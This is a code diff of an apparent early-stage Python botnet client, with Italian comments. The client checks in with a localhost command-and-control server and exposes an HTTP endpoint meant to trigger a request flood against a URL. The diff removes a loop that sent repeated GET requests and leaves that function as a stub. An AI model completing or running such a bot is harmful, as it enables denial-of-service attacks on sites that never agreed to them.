@@ -1,34 +1,28 @@
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
 import requests
 import socket
 import json
-import atexit
-
-# TODO implementare con httpservere e base request handler
-class Bot:
-
-    def __init__(self, cnc_addr, cnc_port):
-        self.address = (cnc_addr, cnc_port)
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket.bind(self.address)
-        self.socket.listen(10)
 
 
-    def request_handler(self, req):
-        print(req)
+class Bot(BaseHTTPRequestHandler):
+
+    def do_GET(self):
+        if self.path == '/info': # TODO con platform
+            pass
+        elif self.path == '/status':
+            self.send_response(200)
+        else:
+            self.send_response(404)
+        self.end_headers()
+
+    def do_POST(self):
+        if self.path == '/send-requests':
+            self.send_requests(0, 0)
 
     def send_requests(self, url, n):
         for _ in range(n):
-            response = requests.get(url)
-            print(f"Response status code: {response.status_code}")
-
-    def daemon(self):
-        while True:
-            client, address = self.socket.accept()
-            request = client.recv(1024)
-            self.request_handler(request.decode('utf-8'))
-            requests.Response()
-            # client.close()
-
+            pass
 
 
 CNC_ADDR = "127.0.0.1"
@@ -43,10 +37,14 @@ def exit_handler():
 
 
 if __name__ == '__main__':
-    atexit.register(exit_handler)
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((CNC_ADDR, CNC_PORT))
         s.send(b"new")
         print("Connected to the Command & Control")
-    bot = Bot("127.0.0.1", 80)
-    bot.daemon()
+
+    bot = HTTPServer(('127.0.0.1', 80), Bot)
+
+    try:
+        bot.serve_forever()
+    except KeyboardInterrupt:
+        exit_handler()
